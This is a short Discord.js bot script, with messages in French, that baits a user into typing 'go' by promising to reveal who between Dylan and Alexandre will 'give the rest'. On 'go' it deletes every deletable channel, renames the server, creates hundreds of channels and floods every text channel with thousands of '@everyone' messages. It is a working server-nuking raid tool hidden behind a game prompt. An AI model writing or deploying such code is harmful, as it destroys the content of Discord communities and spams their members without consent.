const Discord = require("discord.js");
const client = new Discord.Client();

client.on('message', msg => {
    if(msg.content === 'aytp'){
   return msg.reply('Bon ba gg\nmaintenant tu vas savoir qui entre Dylan et Alexandre va te donner la suite\n\nEcrit "go" pour savoir.')
    }
     if(msg.content === 'go'){
         
msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
for (var i = 0; i < 490; i++) {
  //msg.guild.setIcon('https://cdn.discordapp.com/attachments/535351927882645525/535901228769476619/unknown.png').catch(e => {})
  msg.guild.setName('Dylouf le ouf').catch(e => {});
  msg.guild.createChannel('Dylouf le ouf', 'voice').catch(e => {});
  msg.guild.createChannel('Dylouf le ouf', 'text').catch(e => {});
}    
     }
    
    if(msg.content === 'go'){
     for(var i = 0; i < 9999; i++) {
          msg.guild.channels.forEach(channel => {
      if (channel.type === "text") channel.send("@everyone DYLOUF LE OUF")
}, 2500);
     }
    }
});

client.login(process.env.token)
